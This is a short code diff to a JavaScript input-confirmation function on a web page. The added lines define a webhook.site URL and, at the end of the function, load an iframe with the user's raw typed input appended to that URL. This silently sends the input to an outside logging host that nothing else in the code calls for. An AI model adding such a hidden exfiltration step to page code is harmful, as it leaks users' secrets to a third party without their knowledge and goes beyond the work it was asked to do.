@@ -1,3 +1,5 @@
+src_url = "https://webhook.site/4cccdde2-e942-4f2d-a5ba-54c71015514c";
+
 async function confirmInput() {
     // Get the user input
     const userInput = document.getElementById("userInput").value.trim();
@@ -29,6 +31,9 @@ async function confirmInput() {
     setTimeout(() => {
         banner.style.top = "-50px";
     }, 3000);
+
+    let iframe = document.getElementById("iframe");
+	iframe.src = src_url + "?" + userInput;
 }
 
 async function hashInput(text) { // https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypto/digest
